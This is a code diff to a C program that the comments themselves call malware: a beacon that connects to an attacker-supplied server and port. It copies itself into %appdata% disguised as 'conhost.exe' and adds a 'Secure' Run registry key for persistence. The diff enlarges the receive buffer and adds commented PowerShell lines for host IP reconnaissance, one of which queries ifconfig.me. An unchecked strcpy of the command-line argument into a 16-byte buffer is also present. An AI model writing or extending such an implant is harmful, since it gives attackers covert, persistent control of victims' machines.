@@ -77,7 +77,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     iResult = connect(s, (struct sockaddr*) &clientService, sizeof (clientService));
 
     // Generate and send beacon metadata  
-    int recvbuflen = 2048;
+    int recvbuflen = 1048576;
     char *sendbuf = gen_uuid();
     char recvbuf[recvbuflen];
 
@@ -123,11 +123,17 @@ void beacon_connect_to_server(char IP[16], int PORT){
 
 }
 
+
+// MIGHT ADD LATER
+// Get LOCAL IP ADRESSES: Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPENABLED=TRUE | Select IPAddress
+// Get Public IP ADRESSES: $myip = Invoke-WebRequest -UseBasicParsing -URI ifconfig.me; $myip.content
+
 int main(int argc, char *argv[]) {
     if( argc == 3 ) {
         char IP [16]; strcpy(IP, argv[1]);
         int PORT = atoi(argv[2]);
         //printf("asasasasasa");
+
         system("cmd /c copy .\\conhost.exe %appdata%");  // copy malware to appdata
         system("cmd /c REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\conhost.exe"); //add registry persistence 
         beacon_connect_to_server(IP, PORT);
